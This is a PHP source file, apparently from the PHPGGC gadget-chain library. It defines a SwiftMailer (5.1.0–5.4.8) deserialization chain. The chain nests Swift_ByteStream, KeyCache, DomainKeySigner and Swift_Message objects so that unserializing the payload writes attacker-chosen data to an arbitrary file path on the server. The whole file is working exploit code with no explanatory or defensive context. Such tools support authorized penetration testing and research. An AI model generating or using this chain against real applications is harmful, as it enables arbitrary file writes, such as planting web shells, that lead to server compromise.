<?php

namespace GadgetChain\SwiftMailer;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '5.1.0 <= 5.4.8';
    public static $vector = '__toString';
    public static $author = 'cf';

    public function process_parameters(array $parameters)
    {
        $parameters = parent::process_parameters($parameters);

        # \n must be preceeded by \r as per Swift_Signers_DomainKeySigner,
        # line 460
        $parameters['data'] = preg_replace(
            "/(?!\r)\n/",
            "\r\n",
            $parameters['data']
        );

        return $parameters;
    }

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $a = new \Swift_ByteStream_FileByteStream($path);
        $b = new \Swift_KeyCache_SimpleKeyCacheInputStream($a);
        $c = new \Swift_KeyCache_ArrayKeyCache($b);
        $d = new \Swift_Signers_DomainKeySigner($b);
        $e = new \Swift_Message($d, $c, $parameters['data']);

        return $e;
    }
}